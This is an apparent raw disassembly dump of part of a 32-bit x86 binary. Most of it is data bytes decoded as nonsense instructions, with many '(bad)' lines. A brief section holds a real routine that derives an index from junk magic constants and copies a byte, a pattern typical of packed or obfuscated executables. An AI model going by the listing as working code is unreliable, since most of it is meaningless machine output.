  414e68:	dec    ecx
  414e69:	and    al,0x65
  414e6b:	or     eax,0xdbfd93f2
  414e70:	add    DWORD PTR [ecx+ebp*8+0x17],esi
  414e74:	inc    eax
  414e75:	outs   dx,BYTE PTR ds:[esi]
  414e76:	push   ecx
  414e77:	and    al,0x99
  414e79:	dec    eax
  414e7a:	(bad)  
  414e7c:	xor    cl,BYTE PTR [edi-0x15c7716d]
  414e82:	jb     0x414ec3
  414e84:	leave  
  414e85:	xchg   ebx,eax
  414e86:	ret    0x795f
  414e89:	pop    edi
  414e8a:	xchg   edi,eax
  414e8b:	(bad)  
  414e8c:	pop    esp
  414e8d:	and    dh,BYTE PTR [ebx+0x6d]
  414e90:	and    ebp,ecx
  414e92:	sbb    bh,BYTE PTR cs:[edi]
  414e95:	and    ebp,DWORD PTR [esi+0x8cf7aff]
  414e9b:	iret   
  414e9c:	lock fucom st(1)
  414e9f:	int3   
  414ea0:	out    dx,al
  414ea1:	push   edi
  414ea2:	xchg   ebx,eax
  414ea3:	cli    
  414ea4:	sub    eax,0x74b74045
  414ea9:	lds    ecx,FWORD PTR [si]
  414eac:	jg     0x414edc
  414eae:	bound  edi,QWORD PTR [ecx-0x4f043158]
  414eb4:	mov    ebp,0xf4e25c7f
  414eb9:	mov    ds:0x587bfe60,eax
  414ebe:	sbb    al,ah
  414ec0:	cmp    al,0xad
  414ec2:	lahf   
  414ec3:	cmp    al,0x96
  414ec5:	in     eax,0xa0
  414ec7:	in     al,0x78
  414ec9:	mov    DWORD PTR [edx+ebx*4-0x17],edi
  414ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ece:	imul   esp,DWORD PTR [ebp-0x7],0x5d1f3f8e
  414ed5:	in     al,dx
  414ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed7:	cdq    
  414ed8:	xchg   esp,eax
  414ed9:	jno    0x414eda
  414edb:	popa   
  414edc:	pop    ebx
  414edd:	aam    0xc0
  414edf:	pop    ds
  414ee0:	push   eax
  414ee1:	xchg   BYTE PTR [edx-0x2d],cl
  414ee4:	cmp    dh,dh
  414ee6:	shr    ecx,0x84
  414ee9:	inc    ebx
  414eea:	cli    
  414eeb:	in     al,dx
  414eec:	out    0xf5,al
  414eee:	pop    ecx
  414eef:	jb     0x414f42
  414ef1:	pop    ebp
  414ef2:	xor    al,0x83
  414ef4:	dec    eax
  414ef5:	aad    0x6c
  414ef7:	mov    al,0x64
  414ef9:	adc    esi,DWORD PTR [edx]
  414efb:	inc    ebx
  414efc:	mov    DWORD PTR [eax],ebp
  414efe:	fdivr  DWORD PTR [ebp+0x60]
  414f01:	lock mul DWORD PTR [ecx-0x786c115c]
  414f08:	pop    eax
  414f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f0a:	adc    esp,DWORD PTR [edi]
  414f0c:	mov    ebx,0x5cd7b50f
  414f11:	jo     0x414eb2
  414f13:	mov    ebx,DWORD PTR [eax]
  414f15:	shr    DWORD PTR [ecx],1
  414f17:	adc    eax,0x54abc1ec
  414f1c:	push   esi
  414f1d:	xchg   ebp,eax
  414f1e:	in     al,0x37
  414f20:	cmp    DWORD PTR [edx-0x3e],eax
  414f23:	jl     0x414f66
  414f25:	add    al,0xd
  414f27:	leave  
  414f28:	les    esi,FWORD PTR ds:0xa2e2719a
  414f2e:	iret   
  414f2f:	sbb    ch,ch
  414f31:	inc    esp
  414f32:	fisubr WORD PTR [esi-0xc]
  414f35:	pop    eax
  414f36:	mov    esi,0x31fa4ee5
  414f3b:	mov    ecx,0x234c22ad
  414f40:	jmp    0x414f1a
  414f42:	inc    edx
  414f43:	xchg   BYTE PTR [ebx+0x6d2c60aa],bh
  414f49:	mov    DWORD PTR [ebp+0x2c],esi
  414f4c:	or     al,0x46
  414f4e:	inc    edi
  414f4f:	jo     0x414f60
  414f51:	xor    ah,BYTE PTR [ecx-0x1d]
  414f54:	mov    ebp,0xbb1bd683
  414f59:	sbb    cl,BYTE PTR [ebx-0x4e87b800]
  414f5f:	xchg   ecx,eax
  414f60:	cmc    
  414f61:	test   eax,0xbf5d5484
  414f66:	dec    ebx
  414f67:	inc    ecx
  414f68:	inc    esp
  414f69:	dec    edi
  414f6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f6b:	or     al,0x7d
  414f6d:	inc    ebp
  414f6e:	xchg   edi,eax
  414f6f:	xor    edi,DWORD PTR [esi+0x5a]
  414f72:	fild   WORD PTR [ebx-0x6a8f66d7]
  414f78:	pusha  
  414f79:	hlt    
  414f7a:	sbb    BYTE PTR [edx],0x21
  414f7d:	pop    ds
  414f7e:	mov    esi,DWORD PTR [edx-0x6e8ce5b7]
  414f84:	push   ebp
  414f85:	jae    0x414f7a
  414f87:	sub    BYTE PTR [ebx-0x6e],bl
  414f8a:	sbb    esp,DWORD PTR ds:0x75814ad0
  414f90:	add    DWORD PTR [edi+0x76],0x37246ce8
  414f97:	call   0xaa08c893
  414f9c:	jl     0x414f9f
  414f9e:	xchg   edx,eax
  414f9f:	mov    cl,0xbf
  414fa1:	fadd   DWORD PTR [ebx]
  414fa3:	mov    edx,ebx
  414fa5:	aaa    
  414fa6:	(bad)  
  414fa7:	or     al,0x47
  414fa9:	push   0x15
  414fab:	pop    edi
  414fac:	js     0x415017
  414fae:	and    al,0x4f
  414fb0:	jle    0x414f70
  414fb2:	jecxz  0x414f9d
  414fb4:	aas    
  414fb5:	loopne 0x415010
  414fb7:	fisttp WORD PTR [ebx-0x45b87daf]
  414fbd:	mov    DWORD PTR [ecx],ebp
  414fbf:	lods   eax,DWORD PTR ds:[esi]
  414fc0:	sub    DWORD PTR [ebx],ebx
  414fc2:	adc    ebp,DWORD PTR [esi-0x1e28cb43]
  414fc8:	xor    BYTE PTR [ebp+0x5c],dh
  414fcb:	inc    ecx
  414fcc:	add    eax,DWORD PTR [ecx+edi*2+0x2b]
  414fd0:	jbe    0x41503b
  414fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd3:	add    eax,0xe4e1e2bb
  414fd8:	xor    ebp,DWORD PTR [edx-0x7856a377]
  414fde:	xor    DWORD PTR [edx],ebx
  414fe0:	enter  0x3bd6,0x22
  414fe4:	ret    
  414fe5:	test   eax,0x302f1956
  414fea:	(bad)
  414fee:	and    edx,DWORD PTR [esi+0x2e]
  414ff1:	stos   BYTE PTR es:[edi],al
  414ff2:	cdq    
  414ff3:	push   esi
  414ff4:	fwait
  414ff5:	or     al,0x9e
  414ff7:	push   eax
  414ff8:	jle    0x414fde
  414ffa:	popf   
  414ffb:	sub    al,0xb1
  414ffd:	xchg   edi,eax
  414ffe:	mov    esi,0x28c5a79a
  415003:	ret    
  415004:	sbb    bh,0x9
  415007:	dec    esi
  415008:	push   esi
  415009:	vminps xmm2,xmm3,XMMWORD PTR [edi+0x4e]
  41500e:	and    al,0xa9
  415010:	sub    edi,esp
  415012:	std    
  415013:	mov    dh,0x54
  415015:	fwait
  415016:	ret    
  415017:	dec    ecx
  415018:	sbb    BYTE PTR [edi-0x4b],bh
  41501b:	gs push es
  41501d:	scas   eax,DWORD PTR es:[edi]
  41501e:	mov    eax,DWORD PTR [ebx]
  415020:	pushf  
  415021:	ja     0x415053
  415023:	(bad)  
  415024:	(bad)  
  415025:	jnp    0x414fd2
  415027:	push   ds
  415028:	sbb    al,0x61
  41502a:	lock cmp esp,edi
  41502d:	mov    ds:0xa2bd23bd,al
  415032:	or     DWORD PTR [esi+0x28],ebx
  415035:	int3   
  415036:	ficomp DWORD PTR [edi+0x2d3cc2d8]
  41503c:	out    0x62,al
  41503e:	call   0xbc48ef44
  415043:	xlat   BYTE PTR ds:[ebx]
  415044:	pop    ds
  415045:	inc    ebx
  415046:	mov    al,0xaa
  415048:	xchg   ebx,eax
  415049:	inc    ecx
  41504a:	pop    edi
  41504b:	aas    
  41504c:	add    eax,edx
  41504e:	fdiv   st,st(3)
  415050:	sub    BYTE PTR [esp+ebx*2+0x40],al
  415054:	cdq    
  415055:	mov    bl,0x35
  415057:	das    
  415058:	push   cs
  415059:	sub    BYTE PTR [edi-0x8],ah
  41505c:	jmp    0x414fe5
  41505e:	jp     0x415046
  415060:	repz add bl,BYTE PTR ds:0x558a2737
  415067:	pusha  
  415068:	push   eax
  415069:	sar    DWORD PTR [ebp-0x4],1
  41506c:	es fxch st(3)
  41506f:	cdq    
  415070:	or     dl,BYTE PTR [edx+0x7da9a669]
  415076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415077:	stos   BYTE PTR es:[edi],al
  415078:	add    eax,0xaf0f93e0
  41507d:	add    ecx,DWORD PTR [esi]
  41507f:	adc    eax,DWORD PTR [edi-0xe]
  415082:	sub    eax,0x19ca95c5
  415087:	stos   BYTE PTR es:[edi],al
  415088:	adc    ebx,DWORD PTR [edx+0xe74716d]
  41508e:	sar    DWORD PTR ss:[edi],1
  415091:	sbb    dh,BYTE PTR [ebx]
  415093:	pop    ebp
  415094:	(bad)  
  415095:	and    ch,dh
  415097:	add    DWORD PTR ss:[edx+0x1b6064e9],0x7743e191
  4150a2:	sbb    BYTE PTR [ebx-0xe],al
  4150a5:	sub    eax,0xd0a54362
  4150aa:	popf   
  4150ab:	add    DWORD PTR [eax-0x9],eax
  4150ae:	ds dec ecx
  4150b0:	fsub   st(1),st
  4150b2:	pop    ebp
  4150b3:	xor    eax,0x8fecb07d
  4150b8:	pop    ebp
  4150b9:	retf   
  4150ba:	clc    
  4150bb:	pop    ss
  4150bc:	dec    eax
  4150bd:	add    DWORD PTR [ecx],eax
  4150bf:	lds    esp,FWORD PTR [edi]
  4150c1:	lods   eax,DWORD PTR ds:[esi]
  4150c2:	out    0xaa,al
  4150c4:	fsubrp st(2),st
  4150c6:	jne    0x41509d
  4150c8:	clc    
  4150c9:	data16 stos BYTE PTR es:[edi],al
  4150cb:	mov    DWORD PTR [ebx+eiz*8+0x1b],0xe86bc08f
  4150d3:	(bad)  
  4150d5:	fimul  DWORD PTR [edi]
  4150d7:	mov    bh,0x84
  4150d9:	or     esi,ebp
  4150db:	into   
  4150dc:	sub    DWORD PTR [esi],ebp
  4150de:	jne    0x415077
  4150e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e1:	push   esi
  4150e2:	pop    DWORD PTR [edi]
  4150e4:	clc    
  4150e5:	adc    al,0x2a
  4150e7:	mov    bh,BYTE PTR [ebx-0x375a471b]
  4150ed:	mov    eax,ds:0xf997c39d
  4150f2:	aad    0x1b
  4150f4:	push   0x41505416
  4150f9:	push   ebx
  4150fa:	ss push ss
  4150fc:	(bad)  
  4150fd:	fist   DWORD PTR ds:0xfc3415f0
  415103:	and    eax,0xafe01aa7
  415108:	int3   
  415109:	pop    esp
  41510a:	pop    edx
  41510b:	outs   dx,BYTE PTR ds:[esi]
  41510c:	in     al,0x90
  41510e:	inc    esp
  41510f:	adc    DWORD PTR [eax+eax*2],esp
  415112:	jg     0x415124
  415114:	dec    esi
  415115:	xchg   edi,eax
  415116:	cs iret 
  415118:	push   eax
  415119:	sbb    al,0x9a
  41511b:	fs push edx
  41511d:	in     al,dx
  41511e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41511f:	das    
  415120:	idiv   edi
  415122:	cs pop eax
  415124:	stc    
  415125:	ss daa 
  415127:	cld    
  415128:	mov    al,0xa1
  41512a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41512b:	fsubr  DWORD PTR [edi+ebp*1]
  41512e:	push   es
  41512f:	(bad)  
  415130:	aad    0x69
  415132:	outs   dx,BYTE PTR ds:[esi]
  415133:	dec    ebx
  415134:	cmp    eax,0xc1dcfd91
  415139:	out    dx,eax
  41513a:	add    eax,0xa4b152f3
  41513f:	call   DWORD PTR [ebx+0x22]
  415142:	fmul   st,st(6)
  415144:	in     eax,0xae
  415146:	lahf   
  415147:	sub    BYTE PTR [eax+edx*8+0x2ed5fd9c],0x19
  41514f:	popf   
  415150:	xchg   edx,eax
  415151:	scas   al,BYTE PTR es:[edi]
  415152:	xchg   ebx,esp
  415154:	jmp    0x9cc:0xcd735ff2
  41515b:	xor    al,0x7
  41515d:	mov    dl,0xe0
  41515f:	sub    bh,BYTE PTR [edx-0x7c]
  415162:	xchg   al,ch
  415164:	mov    edx,0x5c5760bf
  415169:	sbb    al,0xb
  41516b:	mov    ds:0xb68cab0e,al
  415170:	jbe    0x4151ea
  415172:	mov    al,ds:0x84154913
  415177:	mov    ebp,0x42eb5cce
  41517c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41517d:	imul   eax,DWORD PTR [edx],0x7b
  415180:	mov    edi,0x4d543a3f
  415185:	push   ds
  415186:	or     cl,BYTE PTR [esi+0x2d141558]
  41518c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41518d:	and    eax,0x41188fd3
  415192:	pop    ecx
  415193:	xchg   esp,eax
  415194:	(bad)
  415197:	mov    dl,0xb4
  415199:	dec    ebx
  41519a:	pop    edx
  41519b:	les    eax,FWORD PTR [edi]
  41519d:	mov    dl,0x32
  41519f:	ret    
  4151a0:	mov    bh,0x45
  4151a2:	push   ecx
  4151a3:	lods   eax,DWORD PTR ds:[esi]
  4151a4:	pop    es
  4151a5:	xor    al,0xcc
  4151a7:	push   0xa31df7df
  4151ac:	adc    DWORD PTR [esi],ebx
  4151ae:	fbstp  TBYTE PTR [ecx+0x22]
  4151b1:	cld    
  4151b2:	std    
  4151b3:	add    eax,0xa61ad0cc
  4151b8:	jb     0x415160
  4151ba:	or     eax,0x4636fb2
  4151bf:	scas   al,BYTE PTR es:[edi]
  4151c0:	mov    bh,0x1
  4151c2:	jnp    0x4151d3
  4151c4:	lods   eax,DWORD PTR ds:[esi]
  4151c5:	clc    
  4151c6:	mov    al,ds:0xa6226e02
  4151cb:	aaa    
  4151cc:	stos   DWORD PTR es:[edi],eax
  4151cd:	pusha  
  4151ce:	push   ds
  4151cf:	push   0x51
  4151d1:	mov    ebx,0x548b7db1
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x127e1b8c]
  415305:	arpl   WORD PTR [ecx-0x42],ax
  415308:	mov    esp,0xb518160e
  41530d:	adc    bl,BYTE PTR [eax]
  41530f:	sbb    al,bl
  415311:	xor    al,0xaa
  415313:	mul    BYTE PTR [ebx+0x72]
  415316:	rcl    BYTE PTR [edi-0x34],0x72
  41531a:	clc    
  41531b:	je     0x41538b
  41531d:	int3   
  41531e:	jmp    0x9825:0xe66a55c0
  415325:	ja     0x4152c4
  415327:	or     ebx,DWORD PTR [eax-0x9]
  41532a:	jmp    0x415329
  41532c:	jle    0x415346
  41532e:	rcr    edi,1
  415330:	push   0xffffffe2
  415332:	aad    0x79
  415334:	cmc    
  415335:	xor    ecx,DWORD PTR [eax+edi*8+0x48]
  415339:	xchg   esi,eax
  41533a:	push   eax
  41533b:	jle    0x41532e
  41533d:	xlat   BYTE PTR ds:[ebx]
  41533e:	loope  0x4152d9
  415340:	mov    ch,0x12
  415342:	pop    esi
  415343:	je     0x415396
  415345:	icebp  
  415346:	in     al,dx
  415347:	icebp  
  415348:	pusha  
  415349:	jg     0x4153bb
  41534b:	data16 arpl WORD PTR [esi],cx
  41534e:	pop    esp
  41534f:	push   edx
  415350:	inc    BYTE PTR [ebx]
  415352:	lods   eax,DWORD PTR ds:[esi]
  415353:	mov    ah,0x0
  415355:	(bad)  
  415356:	outs   dx,DWORD PTR ds:[esi]
  415357:	out    dx,eax
  415358:	xchg   edx,eax
  415359:	stos   BYTE PTR es:[edi],al
  41535a:	(bad)  
  41535b:	jae    0x4153b7
  41535d:	jl     0x4152e2
  41535f:	or     dl,BYTE PTR [eax]
  415361:	clc    
  415362:	mov    dl,0xb6
  415364:	mov    dl,0xa5
  415366:	adc    ecx,DWORD PTR [edi+esi*1]
  415369:	add    eax,0x35f2c3c
  41536e:	jge    0x415349
  415370:	lock stos DWORD PTR es:[edi],eax
  415372:	add    DWORD PTR [ebx-0x2ac5df69],ebp
  415378:	sbb    BYTE PTR [esi],ah
  41537a:	ret    0xf08b
  41537d:	push   ebx
  41537e:	inc    ebx
  41537f:	ds jmp 0x427f:0x1d853935
  415387:	call   0xfcee:0x27a6c502
  41538e:	idiv   DWORD PTR [edi-0x47]
  415391:	adc    BYTE PTR [edx+0x5d4653],bh
  415397:	in     eax,0x28
  415399:	fucom  st(0)
  41539b:	mov    ecx,DWORD PTR [edx+0x2d3b0ffa]
  4153a1:	outs   dx,BYTE PTR ds:[esi]
  4153a2:	loop   0x4153c9
  4153a4:	push   ecx
  4153a5:	sub    DWORD PTR [esi+0x3a73e04d],ecx
  4153ab:	adc    eax,0xfe1727e8
  4153b0:	in     eax,dx
  4153b1:	mov    eax,ds:0x67a97b40
  4153b6:	cld    
  4153b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b8:	dec    ecx
  4153b9:	and    bh,BYTE PTR [eax+eax*1-0x21]
  4153bd:	and    cl,ch
  4153bf:	sbb    dh,BYTE PTR [eax]
  4153c1:	loopne 0x41541c
  4153c3:	ror    ebp,0x20
  4153c6:	sbb    BYTE PTR [ebx+0x1e8a0709],ah
  4153cc:	jmp    0xbfad:0x82937403
  4153d3:	jp     0x415452
  4153d5:	push   ecx
  4153d6:	arpl   WORD PTR [edi-0x7f],ax
  4153d9:	pop    es
  4153da:	mov    edi,0x80d90ec
  4153df:	jno    0x415377
  4153e1:	data16 or al,0xbf
  4153e4:	bnd js 0x415420
  4153e7:	fndisi(8087 only) 
  4153e9:	repz pop esi
  4153eb:	and    dl,dl
  4153ed:	mov    eax,ds:0x98f64f61
  4153f2:	hlt    
  4153f3:	pushf  
  4153f4:	adc    al,0xdf
  4153f6:	or     DWORD PTR [esi+ecx*4+0x5e7c6dfe],0xe
  4153fe:	dec    ebx
  4153ff:	sub    eax,0x5ab34dd1
  415404:	dec    ebp
  415405:	jmp    0x1795:0xb82f151b
  41540c:	jg     0x415393
  41540e:	hlt    
  41540f:	xchg   ebx,eax
  415410:	cwde   
  415411:	push   eax
  415412:	inc    edx
  415413:	mov    esi,0x63c5c62e
  415418:	inc    ebp
  415419:	push   esi
  41541a:	jmp    0x74fe:0x494c7f5c
  415421:	mov    ah,BYTE PTR [edi]
  415423:	xor    ebx,DWORD PTR ds:0x21a51ea7
  415429:	push   ecx
  41542a:	cmc    
  41542b:	ficom  WORD PTR [edx+0x1a292049]
  415431:	out    dx,eax
  415432:	inc    edi
  415433:	jne    0x41540a
  415435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415436:	in     al,0x45
  415438:	mov    al,0x21
  41543a:	repz or eax,0x660d091
  415440:	xchg   esp,eax
  415441:	cmp    BYTE PTR [ebx-0x71],al
  415444:	es out 0xda,eax
  415447:	pshufw mm3,mm1,0x49
  41544b:	mov    al,ds:0x3c340a95
  415451:	jge    0x415493
  415453:	dec    eax
  415454:	aad    0x7b
  415456:	fnstsw WORD PTR [ecx+esi*4+0x6]
  41545a:	(bad)  
  41545c:	aam    0x0
  41545e:	pop    ss
  41545f:	rol    BYTE PTR [ecx+0xf8cdae0],0xae
  415466:	je     0x4153e9
  415468:	sub    dl,BYTE PTR [eax]
  41546a:	dec    esp
  41546b:	or     al,0xeb
  41546d:	jle    0x4154e4
  41546f:	add    BYTE PTR [eax-0x7b],al
  415472:	hlt    
  415473:	or     bl,BYTE PTR [ebx]
  415475:	sub    al,0xf3
  415477:	mov    BYTE PTR [ebp+0x75],ch
  41547a:	cld    
  41547b:	(bad)  
  41547c:	fstp   DWORD PTR [ebp-0x3d]
  41547f:	fnsave [eax]
  415481:	imul   ebp,DWORD PTR [esi+esi*8],0xffffff91
  415485:	jbe    0x415419
  415487:	dec    esp
  415488:	jns    0x41542e
  41548a:	add    eax,0x66a44a8b
  41548f:	xchg   ebp,eax
  415490:	mov    ds:0xac6b52f6,eax
  415495:	enter  0x2695,0x98
  415499:	arpl   sp,cx
  41549b:	mov    cl,0xb0
  41549e:	or     BYTE PTR [eax+0x40],bl
  4154a1:	mov    bl,0x9e
  4154a3:	jle    0x4154ef
  4154a5:	mov    dl,0x82
  4154a7:	fsub   st(3),st
  4154a9:	cmp    al,0xf
  4154ab:	dec    esi
  4154ac:	or     BYTE PTR [eax+edx*1-0x7d],bh
  4154b0:	dec    esi
  4154b2:	xchg   esp,eax
  4154b3:	pop    esp
  4154b4:	(bad)  
  4154b5:	sti    
  4154b6:	mov    ebx,0xafb308e1
  4154bb:	shl    BYTE PTR [ecx-0x77],cl
  4154be:	cmc    
  4154bf:	jae    0x4154d0
  4154c1:	xor    ch,BYTE PTR [ecx+ebx*4-0xf]
  4154c5:	retfw  
  4154c7:	jns    0x41553f
  4154c9:	(bad)  
  4154ca:	cld    
  4154cb:	lods   eax,DWORD PTR ds:[esi]
  4154cc:	cmp    bh,al
  4154ce:	push   0xad925ac9
  4154d3:	ss and eax,0x6d99711c
  4154d9:	test   DWORD PTR [edx-0x65],edx
  4154dc:	fmul   QWORD PTR cs:[edx]
  4154df:	or     al,0xbe
  4154e1:	daa    
  4154e2:	fistp  QWORD PTR [esi]
  4154e4:	push   ss
  4154e5:	into   
  4154e6:	and    edx,DWORD PTR [edx+0x117bdcbb]
  4154ec:	jb     0x41548e
  4154ee:	call   0x418e:0x89bad924
  4154f5:	mov    eax,0x7bee2b0
  4154fa:	enter  0x3240,0xf9
  4154fe:	rcr    DWORD PTR [edx+0x21ea42db],0x2e
  415505:	inc    ebx
  415506:	cwde   
  415507:	inc    edi
  415508:	fst    DWORD PTR fs:[ebx+eiz*8+0x4df4d97a]
  415510:	popf   
  415511:	and    cl,BYTE PTR [ecx-0x151237c2]
  415517:	scas   eax,DWORD PTR es:[edi]
  415518:	sbb    eax,0xb61cd7bf
  41551d:	stc    
  41551e:	mov    ecx,0xf8286496
  415523:	pop    eax
  415524:	jl     0x4154c1
  415526:	jg     0x415537
  415528:	xchg   edx,eax
  415529:	cmp    eax,0xb54f968d
  41552e:	jae    0x415568
  415530:	inc    ecx
  415531:	repnz mov eax,ds:0x4f55f944
  415537:	int    0x3
  415539:	data16 adc BYTE PTR [eax],0xc4
  41553d:	cmp    al,BYTE PTR [eax+0x2b2a9ec]
  415543:	fwait
  415544:	cmp    eax,0xbad0d0be
  415549:	out    dx,eax
  41554a:	inc    DWORD PTR [eax-0x2c]
  41554d:	and    dh,BYTE PTR [edi+0x3171fb0d]
  415553:	mov    ds:0x8cb2d245,al
  415558:	jns    0x415537
  41555a:	leave  
  41555b:	mov    ds:0xf0789655,al
  415560:	dec    esp
  415561:	sub    bh,BYTE PTR [eax-0x5a2a22af]
  415567:	push   edx
  415568:	popf   
  415569:	dec    edx
  41556a:	jecxz  0x415546
  41556c:	sbb    al,0x3d
  41556e:	out    0x9f,al
  415570:	xchg   ecx,eax
  415571:	dec    esp
  415572:	out    0xbb,al
  415574:	add    dl,BYTE PTR [ecx-0x3488d285]
  41557a:	ds mov eax,0xf23667e3
  415580:	iret   
  415581:	and    edx,DWORD PTR [ebp-0x21]
  415584:	sbb    al,0xef
  415586:	fwait
  415587:	stos   BYTE PTR es:[edi],al
  415588:	fcomp  DWORD PTR cs:[esi-0x28]
  41558c:	ja     0x41559e
  41558e:	mov    dl,BYTE PTR [ebx-0x508920ca]
  415594:	les    edx,FWORD PTR [ebx+0x65]
  415597:	mov    eax,0x5fc9dac5
  41559c:	cmp    edi,ebx
  41559e:	sbb    eax,0xc152592d
  4155a3:	add    BYTE PTR [edi+0x1774f0ab],0xca
  4155aa:	xchg   BYTE PTR [esi],bl
  4155ac:	xor    eax,0xd3a95126
  4155b1:	mov    ecx,0x92c650e4
  4155b6:	or     eax,0x570e204c
  4155bb:	test   eax,0xf1404bbc
  4155c0:	retf   0xa6b9
  4155c3:	inc    eax
  4155c4:	sbb    esi,DWORD PTR ds:0x65b7ff60
  4155ca:	rcr    ecx,1
  4155cc:	xchg   ebp,eax
  4155cd:	jbe    0x41561d
  4155cf:	into   
  4155d0:	mov    esp,0x65715ac5
  4155d5:	scas   al,BYTE PTR es:[edi]
  4155d6:	push   ds
  4155d7:	(bad)  
  4155d8:	and    eax,0xb1f6f846
  4155dd:	and    bh,BYTE PTR [edx]
  4155df:	xchg   ebp,eax
  4155e0:	sub    bh,BYTE PTR [eax+0x2d82667]
  4155e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e7:	xchg   ecx,eax
  4155e8:	mov    bh,0xac
  4155ea:	xchg   DWORD PTR [ebp+0x4c],ebx
  4155ed:	xchg   edi,eax
  4155ee:	or     ebx,esi
  4155f0:	lods   al,BYTE PTR ds:[esi]
  4155f1:	sub    al,0x91
  4155f3:	sub    edi,edx
  4155f5:	xlat   BYTE PTR ds:[ebx]
  4155f6:	push   es
  4155f7:	stc    
  4155f8:	outs   dx,DWORD PTR ds:[esi]
  4155f9:	loop   0x415620
  4155fb:	dec    ebp
  4155fc:	nop
  4155fd:	mov    gs,WORD PTR [ecx-0x68]
  415600:	adc    ch,BYTE PTR [ebx-0x6]
  415603:	xchg   ebp,eax
  415604:	stc    
  415605:	and    DWORD PTR [ecx],ebx
  415607:	mov    eax,ds:0xfd5c56f0
  41560c:	pop    edi
  41560d:	and    al,0xbb
  41560f:	dec    eax
  415610:	pop    ebp
  415611:	daa    
  415612:	sbb    BYTE PTR [ebp-0x2f252074],bh
  415618:	jo     0x4155a4
  41561a:	pop    edx
  41561b:	lods   al,BYTE PTR ds:[esi]
  41561c:	pop    edx
  41561d:	adc    esp,edi
  41561f:	sbb    eax,0x11a0da4a
  415624:	stos   BYTE PTR es:[edi],al
  415625:	pop    ebx
  415626:	mov    cl,0xc3
  415628:	int3   
  415629:	xchg   esi,eax
  41562a:	adc    dl,BYTE PTR [edx+0xb65f7e3]
  415630:	jbe    0x415641
  415632:	fwait
  415633:	jl     0x415688
  415635:	xor    eax,0x83a9bbfc
  41563a:	sub    al,0x5b
  41563c:	dec    ebx
  41563d:	bound  ecx,QWORD PTR [edx-0x4f3ae359]
  415643:	sbb    al,0x2b
  415645:	jnp    0x55cd4690
  41564b:	in     al,dx
  41564c:	imul   eax,eax,0x43bd290
